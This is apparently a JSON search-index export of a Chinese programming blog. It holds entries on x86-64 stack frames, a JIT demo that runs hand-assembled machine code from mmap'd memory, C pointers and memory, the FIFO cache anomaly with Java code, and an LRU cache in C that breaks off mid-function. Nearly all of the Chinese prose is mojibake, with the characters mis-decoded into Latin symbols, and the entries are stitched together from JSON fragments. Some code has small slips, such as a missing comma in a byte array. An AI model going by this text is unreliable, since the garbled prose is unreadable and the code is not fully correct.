%rip çš„ä½œç”¨. å¾ˆå¯¹ç§°çš„æ“ä½œ!\nbombs pushq %rbp ; ä¿ç•™ä¸Šä¸€ä¸ªå‡½æ•°(ä¹Ÿå°±æ˜¯è°ƒç”¨è€…)çš„æ ˆåŸºå€ movq %rsp, %rbp ; æ–°å‡½æ•°çš„æ ˆåŸºå€. ä¸€ä¸ªæ–°çš„æ ˆå¸§ sp å’Œ bp æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªåœ°å€ ä¸€ä¸ªæ‰€è°“çš„æ ˆå¸§(stack frame)å°±æ˜¯ç”± sp(stack pointer) å’Œ bp(base pointer) è¿™ä¸¤ä¸ªå¯„å­˜å™¨æ¥ç»´æŠ¤çš„ã€‚\nåœ¨ç¼–è¯‘å™¨æ²¡æœ‰å¼€å¯ä¼˜åŒ–æƒ…å†µä¸‹ï¼Œè¿™ä¸¤å¥ä¼šå‡ºç°åœ¨æ¯ä¸€ä¸ªå‡½æ•°çš„å¼€å§‹, é‚£ä¹ˆé—®é¢˜æ¥äº† main å‡½æ•°é‡Œé¢ä¿ç•™çš„æ˜¯å“ªä¸€ä¸ªè°ƒç”¨å‡½æ•°çš„æ ˆåŸºå€å‘¢?\nä¸ªäººæ¨æµ‹, ä¸ä¸€å®šæ­£ç¡®, æˆ‘ä»¬çŸ¥é“åˆ›å»ºè¿›ç¨‹(çº¿ç¨‹)æ˜¯ OS å†…æ ¸çš„åŠŸèƒ½, å½“ç„¶è¿›ç¨‹é”€æ¯ä¹Ÿæ˜¯å†…æ ¸çš„åŠŸèƒ½.\nå†…æ ¸åŒæ ·ç»´æŠ¤ç€å±äºå†…æ ¸ç©ºé—´çš„æ ˆå¸§, å½“è¿›ç¨‹åˆ›å»ºå®Œæ¯•å, æˆ‘ä»¬å†™çš„ C ä»£ç åº”è¯¥æ˜¯è¢«å†…æ ¸é‡Œçš„å‡½æ•°è°ƒç”¨çš„, è¿™æ ·çš„è¯ main é‡Œé¢ pushq %rbp åº”è¯¥æ˜¯ä¿ç•™çš„å†…æ ¸å‡½æ•°çš„æ ˆåŸºå€. è¿™æ · main çš„ ret è¿”å›åå°±èƒ½æ¥ç€æ‰§è¡Œå†…æ ¸å‡½æ•°é‡Œé¢çš„é€»è¾‘äº†. (ä¼°è®¡ä¹Ÿå°±æ˜¯é”€æ¯è¿›ç¨‹ä¸€ç³»åˆ—æ“ä½œäº†, è¿™æ ·æ‰èƒ½æŠŠåˆ†é…çš„èµ„æºæ”¶å›æ¥å•Š!)\nreferences program counter A readerâ€™s guide to x86 assembly x86 guide instruction cycle how jump work stack pointer call stack stack-winding(push)-unwinding(pop) understand-heap-assembly eax-x86-register-meaning-and-history flint.cs.yale.edu/cs421/papers/x86-asm/asm.html at\u0026t è¯­æ³• x86-instruction-list stack-frame-example x64 ","ret#\u003ccode\u003eret\u003c/code\u003e":"","stack-management#stack management":"","stack-pointer#stack pointer":""},"title":"asm-how-x86-function-execute"},"/blog/asm-java-jit/":{"data":{"":"","references#References":"å‰è¨€ æ— è®ºå¤šä¹ˆèŠ±é‡Œèƒ¡å“¨çš„åŠŸèƒ½ï¼Œæœ€ç»ˆè½åœ°åˆ°ä¸€å°è®¡ç®—æœºä¸Šï¼Œéƒ½æ˜¯äºŒè¿›åˆ¶ä»£ç ã€‚è™½ç„¶ java ä»£ç è·‘åœ¨ jvm å¹³å°ä¹‹ä¸Šï¼Œä½†æ˜¯ jvm åªæ˜¯è´Ÿè´£æ‰§è¡Œ java è‡ªå®šä¹‰çš„ä¸€å¥— bytecode çš„å·¥å…·ï¼Œåªè¦èƒ½è§£é‡Šå­—èŠ‚ç ï¼Œè¿™ä¸ªå·¥å…·ç”¨ä»€ä¹ˆè¯­è¨€å†™éƒ½æ˜¯å¯ä»¥çš„ã€‚ä¸»æµçš„ HotSpot è™šæ‹Ÿæœºé€‰æ‹©çš„ C++ã€‚\näºŒè¿›åˆ¶ä»£ç æ¢æ C è¯­è¨€ä¸¾ä¾‹ gcc ä¸å¼€å¯ä¼˜åŒ– #include\u003cstdio.h\u003e long desc(long a) { return a - 1; } int main() { printf(\"%ld\\n\", desc(3)); return 0; } å…·ä½“æ±‡ç¼–çº§åˆ«çš„å‚æ•°ä¼ é€’ å¯ä»¥å‚è€ƒè¿™ç¯‡ã€‚x86 æ¶æ„ä¸‹å‡½æ•°å¦‚ä½•ä¹‹è¡Œ å¯ä»¥å‚è€ƒè¿™ç¯‡ã€‚\ngcc -o descv1 desc.c ä¹‹åé€šè¿‡ objdump -d descv11 å¯ä»¥æ‰¾åˆ° long desc(long a) çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š\n000000000000064a \u003cdesc\u003e: 64a: 55 push %rbp ;â¶ ä¿å­˜ä¸Šä¸€ä¸ªæ ˆå¸§çš„ baseï¼Œè¿›å…¥ä¸€ä¸ªå‡½æ•°çš„å¸¸è§„æ“ä½œã€‚ 64b: 48 89 e5 mov %rsp,%rbp ;â· å¼€è¾Ÿæ–°çš„æ ˆå¸§ 64e: 48 89 7d f8 mov %rdi,-0x8(%rbp) ;â¸ å‚æ•° aï¼ˆrdiï¼‰å…¥æ ˆ 652: 48 8b 45 f8 mov -0x8(%rbp),%rax ;â¹ å‚æ•° a ä»æ ˆä¸­å¤åˆ¶åˆ° rax 656: 48 83 e8 01 sub $0x1,%rax ;âº a = a - 1 65a: 5d pop %rbp ;â» å¼¹å‡º rbpï¼Œä¹Ÿå³æ˜¯æ¢å¤ä¸Šä¸€ä¸ªæ ˆå¸§çš„ base 65b: c3 retq ;â¼ å‡½æ•°è¿”å› å¯ä»¥çœ‹åˆ° â¸ å’Œ â¹ è¿™ä¸¤æ­¥æœ‰äº›å¤šä½™ï¼Œè¿™æ˜¯æ²¡æœ‰å¼€å¯ä¼˜åŒ–ï¼Œgcc é»˜è®¤é‡‡ç”¨çš„æ–¹å¼ï¼ŒæŠŠæ‰€æœ‰çš„å‚æ•°å…ˆæ”¾åˆ°æ ˆä¸Šã€‚æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¼˜åŒ–ã€‚\nå¯¹ gcc ä¸å¼€å¯ä¼˜åŒ–é€‰é¡¹çš„æ±‡ç¼–ä»£ç ä¼˜åŒ– #include \u003cstdio.h\u003e #include \u003cmemory.h\u003e #include \u003csys/mman.h\u003e typedef int (*desc_func)(int a); int main() { char desc_code[] = { 0x55, // â¶ push rbp 0x48, 0x89, 0xe5, // â· mov rsp, rbp 0x89, 0xf8, // mov edi, eax ?? 0x48, 0x83, 0xe8, 0x01, // sub $0x1,%rax 0x5d, // â» pop rbp 0xc3 // â¼ ret }; void *temp = mmap(NULL, sizeof(desc_code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, desc_code, sizeof(desc_code)); desc_func p_desc = (desc_func)temp; printf(\"%d\\n\", p_desc(3)); return 0; } å¯ä»¥çœ‹åˆ°åœ¨è¿è¡Œä¸­åˆ›å»º desc å‡½æ•°ï¼Œè¿è¡Œæ—¶ç”Ÿæˆå¯æ‰§è¡Œçš„æœºå™¨ç è¿™ç§æ–¹å¼å…¶å®å°±æ˜¯ JIT å®ç°çš„æ ¸å¿ƒæ“ä½œã€‚ åŒæ—¶å¯ä»¥çœ‹åˆ°ï¼Œæ ¹æœ¬æ²¡æœ‰å¿…è¦å¼€è¾Ÿæ ˆå¸§æ¥æ‰§è¡Œè¿™ä¸ª desc å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥æŠŠ âŠ â‹ â æ ˆå¸§ç›¸å…³æ“ä½œåˆ é™¤ã€‚\nè¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œæ¶ˆé™¤æ ˆå¸§ #include \u003cstdio.h\u003e #include \u003cmemory.h\u003e #include \u003csys/mman.h\u003e typedef int (*desc_func)(int a); int main() { char desc_code[] = { 0x89, 0xf8, // mov edi, eax ?? 0x48, 0x83, 0xe8, 0x01, // sub $0x1,%rax 0xc3 // â¼ ret }; void *temp = mmap(NULL, sizeof(desc_code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, desc_code, sizeof(desc_code)); desc_func p_desc = (desc_func)temp; printf(\"%d\\n\", p_desc(3)); return 0; } å¯ä»¥çœ‹åˆ°ä¸å¼€è¾Ÿæ ˆå¸§ï¼Œä¸€æ ·å¯ä»¥æ‰§è¡Œä»£ç ã€‚\nlea addr dst ä¼˜åŒ– char code[] = { 0x48, 0x8d, 0x47 0xff, // lea -0x1(rdi), rax lea ç›´æ¥å°† rdi å¯„å­˜å™¨é‡Œçš„å€¼å‡å» 1 å¤åˆ¶ç»™ rax 0xc3 // ret }; è¿™ä¸ªå’Œ gcc -o desc desc.c -O2 ç»“æœæ˜¯ä¸€æ ·çš„ã€‚\nReferences java æ‚è°ˆä¹‹ JIT x64-instruction-table https://web.stanford.edu/class/archive/cs/cs107/cs107.1166/guide_x86-64.html http://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf load-effective-address(lea) java-bytecode åœ†åœˆæ•°å­—ç­‰ ","äºŒè¿›åˆ¶ä»£ç æ¢æ#äºŒè¿›åˆ¶ä»£ç æ¢æ":"","å‰è¨€#å‰è¨€":""},"title":"asm-java-jit"},"/blog/asm-pointers-and-memory/":{"data":{"":"","basic-pointer#Basic Pointer":"","memory#memory":"","ownership#ownership":" each blok of memory has exactly one â€œownerâ€ who takes responsibility for deallocating it.\ncaller ownership callee allocated and return ","parameter#parameter":"Basic Pointer ä¸ºå•¥éœ€è¦ Pointerï¼Ÿ æ›´å®¹æ˜“åœ¨ä¸åŒä»£ç æ®µä¹‹é—´å…±äº«ä¿¡æ¯ï¼Œåœ¨ä¸åŒä»£ç æ®µä¹‹é—´æ¥å›å¤åˆ¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä½†ç”¨æŒ‡é’ˆçš„å½¢å¼æ›´å¥½ã€‚ é“¾å¼æ•°æ®ç»“æ„, å¦‚é“¾è¡¨å’ŒäºŒå‰æ ‘ã€‚ pointer dereference æŒ‡é’ˆå¿…é¡»è¦æœ‰æŒ‡å‘çš„å€¼ï¼Œæ‰å¯ä»¥ dereferenceã€‚ æ²¡æœ‰æŒ‡å‘çš„æŒ‡é’ˆï¼Œdereference æ—¶ä¼š runtime errorã€‚\nNULL pointer C -\u003e NULL -\u003e 0 -\u003e false java -\u003e null\npointer assignment æŒ‡é’ˆèµ‹å€¼\ncopy shallow copy copy reference\ndeep copy copy real value\ntwo levels C è¯­è¨€ä¸‹æŒ‡é’ˆæ¢æ long pointer(void * ptr){ long *p = (long*)ptr; return *p; } pointer: pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) movq -24(%rbp), %rax movq %rax, -8(%rbp) movq -8(%rbp), %rax movq (%rax), %rax popq %rbp ret ç”±ä¸Šå¯çŸ¥ï¼šlong *p = (long*)ptr è¢«ç¼–è¯‘æˆ\nmovq -8(%rbp), %rax %rax è¿™ä¸ªå¯„å­˜å™¨é‡Œæ”¾çš„æ˜¯ä¼ æ¥çš„æŒ‡é’ˆ movq (%rax), %rax (%rax) å¯„å­˜å™¨é—´æ¥å¯»å€ï¼Œä¹Ÿå°±æ˜¯å–å¯„å­˜å™¨ %rax æŒ‡å‘çš„å†…å­˜é‡Œçš„å€¼ã€‚è¿™å°±æ˜¯æŒ‡é’ˆåœ¨æ±‡ç¼–å±‚é¢çš„æ„ä¹‰ã€‚ memory variable -\u003e variable name -\u003e memory ç¼–è¯‘åï¼Œå˜é‡åå°±æ²¡æœ‰äº†ã€‚\nlocal memory local memory is allocated automatically on function call and it is deallocated automatically when a function exits.\nç¼–è¯‘å™¨ç®¡ç† local memoryï¼Œsize ç¼–è¯‘æ—¶å†³å®šã€‚ Local memory æœ€æ ¹æœ¬çš„æ€§è´¨ï¼šç›¸äº’ç‹¬ç«‹ï¼Œè¿™æ˜¯æœ¬åœ°å†…å­˜ä¼˜ç‚¹å’Œç¼ºç‚¹çš„æ ¹æœ¬åŸå› ã€‚\nstack frame local memory é€šè¿‡è°ƒç”¨å‡½æ•°æ—¶åˆ›å»ºçš„æ ˆå¸§æ¥ä½“ç°ã€‚\nallocation æ ˆå¸§åˆ›å»ºæ—¶, local variable ä¸€å¹¶åˆ›å»ºã€‚\ndeallocation æ ˆå¸§é”€æ¯æ—¶ï¼Œlocal variable ä¸€å¹¶é”€æ¯ã€‚\nlifetime éšç€å‡½æ•°æ ˆå¸§åŒç”Ÿå…±æ­»ã€‚\nlocal/stack/automatic variable æ ˆå¸§ä¸­çš„å˜é‡ã€‚ local/automatic åº•å±‚ç»å¸¸ä½¿ç”¨ stack ç»“æ„æ¥å®ç°ã€‚\nadvantage of locals convenient. å‡½æ•°éœ€è¦ä¸´æ—¶çš„å†…å­˜ç©ºé—´åšè®¡ç®—ï¼Œè®¡ç®—å®Œæ¯•åï¼Œé‡Šæ”¾ã€‚ efficient. åˆ†é…å’Œé‡Šæ”¾éƒ½å¾ˆå¿«ã€‚ local copies. pass by value local parameters are basically local copies of the information from the caller. caller åŸå€¼ callee å‰¯æœ¬ï¼Œå¦‚ä½•ä¿®æ”¹ä¸å½±å“ caller ä¸­çš„å€¼ è½¯ä»¶è®¾è®¡åŸåˆ™ï¼šseperate components\ndisadvantage of locals short lifetime. å’Œæ ˆå¸§åŒç”Ÿå…±æ­»ã€‚(heap memory è§£å†³) restricted communicationã€‚callerâ€™s parameter -\u003e callee å•å‘é€šä¿¡ã€‚(reference parameter è§£å†³) heap/dynamic memory malloc() free()\nlifetime ç¨‹åºå‘˜è‡ªä¸»å†³å®šä½•æ—¶ç”³è¯·å†…å­˜, ç”³è¯·å¤šå°‘å†…å­˜ï¼Œä½•æ—¶é‡Šæ”¾å†…å­˜ã€‚ runtime å†³å®šã€‚\nparameter pass by value local copy caller parameter(åŸå€¼) callee parameter(å‰¯æœ¬) separate components\npass by reference å…¶å®å°±æ˜¯æŒ‡é’ˆã€‚è¿™ä¸ªäºŒçº§ç»“æ„ã€‚ pointer(ä¸Šçº§)ï¼ŒæŠŠä¸Šçº§ä¼ å‡ºå»ï¼Œå°±å¯ä»¥æŒ‡æŒ¥ä¸‹çº§äº†ã€‚ pointee(ä¸‹çº§) ä¸€çº§æŒ‡é’ˆä¹Ÿå¯ä»¥ç†è§£ä¸º hopï¼Œéå¸¸åƒ router ä¸­çš„ä¸‹ä¸€è·³ã€‚","reference#Reference":" memory and pointers malloc free square-function ","two-levels#two levels":""},"title":"asm-pointers-and-memory"},"/blog/bloomfilter/":{"data":{"":"","references#References":" bloom filter\nbloom filter\nhttps://coderscat.com/bloom-filter/"},"title":"bloomfilter"},"/blog/cache-miss-anomaly/":{"data":{"capacity-miss#capacity miss":" ç¼“å­˜å®¹é‡æœ‰é™ï¼Œéœ€è¦ evict ä¸€äº›é¡µ","compulsory-miss#compulsory miss":" ä¸€å¼€å§‹ç¼“å­˜é‡Œå•¥éƒ½æ²¡æœ‰ï¼Œcold-start miss","conflict-miss#conflict miss":" cpu cache çš„ set-associativity çš„ç¼“å­˜è¡Œ","references#References":" https://pages.cs.wisc.edu/~remzi/OSTEP/vm-beyondphys-policy.pdf ","ç¼“å­˜-miss-ç±»å‹#ç¼“å­˜ miss ç±»å‹":"ç¼“å­˜ miss ç±»å‹","ç¼“å­˜è¶Šå¤§å‘½ä¸­ç‡å°±è¶Šé«˜ä¹ˆä¸æ˜¯çš„#ç¼“å­˜è¶Šå¤§ï¼Œå‘½ä¸­ç‡å°±è¶Šé«˜ä¹ˆï¼Ÿä¸æ˜¯çš„":" 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 é‡‡ç”¨ FIFO çš„ swap ç­–ç•¥ã€‚å®¹é‡ä¸º 3 çš„ç¼“å­˜ï¼Œæ¯”å®¹é‡ä¸º 4 çš„ç¼“å­˜å‘½ä¸­ç‡æ›´é«˜\nimport java.util.concurrent.ArrayBlockingQueue; public class CacheFifo { public static void main(String[] args) { Integer[] pages = {1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5}; calculateCacheHit(pages, 3); calculateCacheHit(pages, 4); } private static void calculateCacheHit(Integer[] pages, int cacheSize) { System.out.print(\"ç¼“å­˜é¡µ: \"); dumpArray(pages); ArrayBlockingQueue\u003cInteger\u003e queue = new ArrayBlockingQueue(cacheSize); int miss = 0; for (int page : pages) { if (!queue.contains(page)) { miss = miss + 1; if (!queue.isEmpty() \u0026\u0026 queue.size() == cacheSize) { dumpArray(queue.toArray()); queue.poll(); } queue.offer(page); dumpArray(queue.toArray()); } } System.out.println(\"cache miss:\" + miss); System.out.println(\"total :\" + pages.length); System.out.println(\"cache hit:\" + (1 - miss * 1.0 / pages.length)); } private static void dumpArray(Object[] array) { for (Object o : array) { System.out.print(o + \" \"); } System.out.println(); } } ç¼“å­˜é¡µ: 1 2 3 4 1 2 5 1 2 3 4 5 1 1 2 1 2 3 1 2 3 2 3 4 2 3 4 3 4 1 3 4 1 4 1 2 4 1 2 1 2 5 1 2 5 2 5 3 2 5 3 5 3 4 cache miss:9 total :12 cache hit:0.25 ç¼“å­˜é¡µ: 1 2 3 4 1 2 5 1 2 3 4 5 1 1 2 1 2 3 1 2 3 4 1 2 3 4 2 3 4 5 2 3 4 5 3 4 5 1 3 4 5 1 4 5 1 2 4 5 1 2 5 1 2 3 5 1 2 3 1 2 3 4 1 2 3 4 2 3 4 5 cache miss:10 total :12 cache hit:0.16666666666666663 "},"title":"Cache Miss Anomaly"},"/blog/cache-replacement-policy-lru/":{"data":{"":"","cache#Cache":"cache ä¸ºå•¥è¦æœ‰ Cache å‘¢ï¼Ÿæ ¹æœ¬åŸå› æ˜¯å„ç§å­˜å‚¨é€Ÿåº¦ä¸åŒ¹é…ã€‚æˆ–è€…ä¸ºäº†åŠ å¿«æŸä¸ªè¿‡ç¨‹ï¼Œç›´æ¥å°†å¤šæ¬¡è½¬æ¢çš„è½¬æ¢ç»“æœç›´æ¥ç¼“å­˜èµ·æ¥ï¼Œä¾¿äºå†æ¬¡ä½¿ç”¨æ—¶ç›´æ¥ç»•å¼€è¿™äº›è½¬æ¢è¿‡ç¨‹ã€‚å…¸å‹çš„å°±æ˜¯ MMU çš„åœ°å€ç¿»è¯‘è¿‡ç¨‹ï¼Œç›´æ¥å°†è™šæ‹Ÿåœ°å€å¤šæ¬¡è½¬æ¢çš„æœ€åç»“æœï¼Œä¹Ÿå°±æ˜¯ç‰©ç†åœ°å€ï¼Œç›´æ¥ç¼“å­˜åˆ° TLB ä¸­ï¼Œä¸‹æ¬¡å†æ¬¡è®¿é—®åŒä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œç›´æ¥ä»è™šæ‹Ÿåœ°å€æ‹¿åˆ°ç‰©ç†åœ°å€ï¼Œç»•å¼€å¤šæ¬¡è½¬æ¢è¿‡ç¨‹ï¼Œè¿™å¯ä¸å°±æé«˜äº†é€Ÿåº¦ã€‚CPU çš„é€Ÿåº¦æ¯” Memory å¿«å¾—å¤šï¼Œä¸ºäº†é…ä¸Š CPU è¶…çº§å¿«çš„é€Ÿåº¦ï¼Œä¹Ÿå°±æœ‰äº† L1ï¼ŒL2ï¼ŒL3 cacheã€‚è¿˜æœ‰å°±æ˜¯å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ï¼Œé€Ÿåº¦å¿«ï¼Œå®¹é‡å°çš„å­˜å‚¨ä½œä¸ºé€Ÿåº¦æ…¢ï¼Œå®¹é‡å¤§çš„ä¸Šçº§ç¼“å­˜ã€‚\ncache replacement ä¸ºå•¥è¦æœ‰ cache replacement å‘¢ï¼Ÿ å› ä¸ºå†å¤§çš„å­˜å‚¨å®¹é‡ä¹Ÿæœ‰é™ï¼Œæ€»æœ‰ä½¿ç”¨å®Œçš„æ—¶å€™ï¼Œä½•å†µé€Ÿåº¦å¿«çš„å­˜å‚¨ï¼Œå®¹é‡æœ¬èº«å°±å°ã€‚cache ä½¿ç”¨å®Œï¼Œå†æœ‰éœ€è¦ç¼“å­˜çš„ä¸œè¥¿ï¼Œå°±éœ€è¦ä»ç¼“å­˜ä¸­å‰”é™¤ä¸€äº›ï¼Œæ¥å­˜æ”¾æ–°çš„å†…å®¹ã€‚é‚£é—®é¢˜å°±æ¥äº†ï¼Œç¼“å­˜ä½¿ç”¨å®Œï¼Œè¯¥å‰”é™¤å“ªäº›å·²ç»ç¼“å­˜çš„å†…å®¹å‘¢ï¼Ÿ è¿™å°±æ˜¯æ‰€è°“çš„ cache replacement policyã€‚ä»ä¸åŒçš„è§’åº¦ï¼Œå¯ä»¥æœ‰ä¸åŒçš„æ›¿æ¢ç­–ç•¥ã€‚\nleast recently used æœ¬æ–‡æ¥è¯´æ˜è¿™ä¸ªç­–ç•¥ã€‚æˆ‘ä¸æƒ³è®°å¿†å®šä¹‰ã€‚æ¥é€šè¿‡ä¸€ä¸ªå®ä¾‹æ¥ç†è§£è¿™ä¸ªç­–ç•¥çš„æ€æƒ³ã€‚ ç£ç›˜è¦ç¼“å­˜åˆ°å†…å­˜ä¸­çš„å†…å®¹åˆ’åˆ†ä¸ºç›¸ç­‰çš„ pageï¼Œç§°ä¹‹ä¸º virtual pageï¼Œæ¯ä¸€ä¸ª page ä¸€ä¸ªç¼–å·ï¼Œç§°ä¹‹ä¸º page numberã€‚ åŒç†ï¼Œå†…å­˜çš„å®¹é‡ä¹Ÿåˆ’åˆ†ä¸ºå’Œç£ç›˜å¤§å°ä¸€è‡´çš„ pageï¼Œç§°ä¹‹ä¸º page frameã€‚ ä»¥ä¸‹ä¸ºè®¿é—®ç£ç›˜ page number çš„é¡ºåºï¼š 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 ç¼“å­˜å¤§å°ä¸º 3 ä¸ª page frameã€‚ç»„æˆä¸€ä¸ªç¼“å­˜ Queue\nvirtual page å­˜æ”¾è§„åˆ™ ç¼“å­˜é˜Ÿåˆ—æ²¡æ»¡ virtual page å·²åœ¨ç¼“å­˜é˜Ÿåˆ—ä¸­ï¼Œå°†ä»£è¡¨ virtual page çš„é˜Ÿåˆ—èŠ‚ç‚¹ç§»åŠ¨åˆ°é˜Ÿé¦–ã€‚ virtual page ä¸åœ¨ç¼“å­˜é˜Ÿåˆ—ä¸­ï¼Œæ·»åŠ ä»£è¡¨è¿™ä¸ª virtual page çš„é˜Ÿåˆ—èŠ‚ç‚¹åˆ°é˜Ÿé¦–ã€‚ ç¼“å­˜é˜Ÿåˆ—å·²æ»¡ virtual page å·²åœ¨ç¼“å­˜é˜Ÿåˆ—ä¸­ï¼Œå°†ä»£è¡¨ virtual page çš„é˜Ÿåˆ—èŠ‚ç‚¹ç§»åŠ¨åˆ°é˜Ÿé¦–ã€‚ virtual page ä¸åœ¨ç¼“å­˜é˜Ÿåˆ—ä¸­ï¼Œç§»é™¤é˜Ÿå°¾é˜Ÿåˆ—èŠ‚ç‚¹ï¼Œæ·»åŠ ä»£è¡¨è¿™ä¸ª virtual page çš„é˜Ÿåˆ—èŠ‚ç‚¹åˆ°é˜Ÿé¦–ã€‚ LRU å›¾è§£ å¯ä»¥çœ‹åˆ°ä¸€ç›´æ˜¯å¯¹ç¼“å­˜é˜Ÿåˆ—é˜Ÿé¦–æ“ä½œã€‚ 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5\nè®¿é—® page 1ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œpage 1 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 2ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œpage 2 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 3ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œpage 3 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 4ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œä¸”ç¼“å­˜é˜Ÿåˆ—æ»¡äº†ã€‚ç§»é™¤é˜Ÿå°¾ page 1ï¼Œpage 4 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 1ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œä¸”ç¼“å­˜é˜Ÿåˆ—æ»¡äº†ã€‚ç§»é™¤é˜Ÿå°¾ page 2ï¼Œpage 1 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 2ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œä¸”ç¼“å­˜é˜Ÿåˆ—æ»¡äº†ã€‚ç§»é™¤é˜Ÿå°¾ page 3ï¼Œpage 2 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 5ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œä¸”ç¼“å­˜é˜Ÿåˆ—æ»¡äº†ã€‚ç§»é™¤é˜Ÿå°¾ page 4ï¼Œpage 5 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 1ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æœ‰ï¼Œpage 1 ç§»åŠ¨åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 2ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æœ‰ï¼Œpage 2 ç§»åŠ¨åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 3ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œä¸”ç¼“å­˜é˜Ÿåˆ—æ»¡äº†ã€‚ç§»é™¤é˜Ÿå°¾ page 5ï¼Œpage 3 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 4ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œä¸”ç¼“å­˜é˜Ÿåˆ—æ»¡äº†ã€‚ç§»é™¤é˜Ÿå°¾ page 1ï¼Œpage 4 æ”¾åˆ°é˜Ÿé¦–ã€‚ è®¿é—® page 5ï¼Œç¼“å­˜é˜Ÿåˆ—ä¸­æ²¡æœ‰ï¼Œä¸”ç¼“å­˜é˜Ÿåˆ—æ»¡äº†ã€‚ç§»é™¤é˜Ÿå°¾ page 2ï¼Œpage 5 æ”¾åˆ°é˜Ÿé¦–ã€‚ æœ€åç¼“å­˜é˜Ÿåˆ—ä¸­å­˜æ”¾çš„æ˜¯ page 5ï¼Œpage 4ï¼Œpage 3ã€‚ ç”±ä¸Šå¯çŸ¥ä»é˜Ÿé¦–åˆ°é˜Ÿå°¾åŒ…å«ç€ä¸€ä¸ªä¿¡æ¯å°±æ˜¯ï¼Œè¶Šæ¥è¿‘é˜Ÿé¦–ï¼Œè¶Šæ˜¯æœ€è¿‘åˆšè®¿é—®çš„ pageã€‚ç¼“å­˜èƒŒåçš„åŸç†å…¶å®å’Œç¨‹åºè¿è¡Œçš„å±€éƒ¨æ€§åŸç†æœ‰å…³ã€‚ é€šè¿‡ä¸Šè¿°æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°é˜Ÿåˆ—èŠ‚ç‚¹è°ƒæ•´éå¸¸é¢‘ç¹ï¼Œä¸”é˜Ÿåˆ—èŠ‚ç‚¹ä¹‹é—´æœ‰å…ˆåå…³ç³»ã€‚è¿™ä¹Ÿå†³å®šäº†é˜Ÿåˆ—æ˜¯ä¸ªåŒç«¯é˜Ÿåˆ—ã€‚ QNode æŒ‡é’ˆæ•°ç»„æŒ‡å‘å·²ç»åœ¨ç¼“å­˜é˜Ÿåˆ—ä¸­çš„ä»£è¡¨ page çš„é˜Ÿåˆ—èŠ‚ç‚¹ã€‚\nLRU å®ç° // A C program to show implementation of LRU cache #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e // A Queue Node (Queue is implemented using Doubly Linked List) typedef struct QNode { struct QNode *prev, *next; unsigned pageNumber; // the page number stored in this QNode } QNode; // A Queue (A FIFO collection of Queue Nodes) typedef struct Queue { unsigned count; // Number of filled frames unsigned numberOfFrames; // total number of frames QNode *front, *rear; } Queue; // A hash (Collection of pointers to Queue Nodes) // æ€æ ·åˆ¤å®š page æ˜¯ä¸æ˜¯å·²ç»åœ¨ cache ä¸­ï¼Œç”¨è¿™ä¸ªç»“æ„ã€‚ typedef struct Hash { int capacity; // how many pages can be there QNode* *array; // an array of queue nodes pointerï¼ŒQNode æŒ‡é’ˆæ•°ç»„ä¸‹æ ‡ä½œä¸º page number ç›´æ¥ç´¢å¼•å¾—åˆ° QNodeï¼Œæˆ–è€…åˆ¤å®š QNode å­˜åœ¨ä¸å¦ã€‚ } Hash; // A utility function to create a new Queue Node. The queue Node // will store the given 'pageNumber' QNode* newQNode( unsigned pageNumber ) { // Allocate memory and assign 'pageNumber' QNode* temp = (QNode *)malloc( sizeof( QNode ) ); temp-\u003epageNumber = pageNumber; // Initialize prev and next as NULL temp-\u003eprev = temp-\u003enext = NULL; return temp; } // A utility function to create an empty Queue. // The queue can have at most 'numberOfFrames' nodes Queue* createQueue( int numberOfFrames ) { Queue* queue = (Queue *)malloc( sizeof( Queue ) ); // The queue is empty queue-\u003ecount = 0; queue-\u003efront = queue-\u003erear = NULL; // Number of frames that can be stored in memory queue-\u003enumberOfFrames = numberOfFrames; return queue; } // A utility function to create an empty Hash of given capacity // capacity å…¶å®å°±æ˜¯ page number èŒƒå›´ Hash* createHash( int capacity ) { // Allocate memory for hash Hash* hash = (Hash *) malloc( sizeof( Hash ) ); printf(\"====\u003e%d\\n\", sizeof(Hash)); hash-\u003ecapacity = capacity; // Create an array of pointers for refering queue nodes hash-\u003earray = (QNode **) malloc( 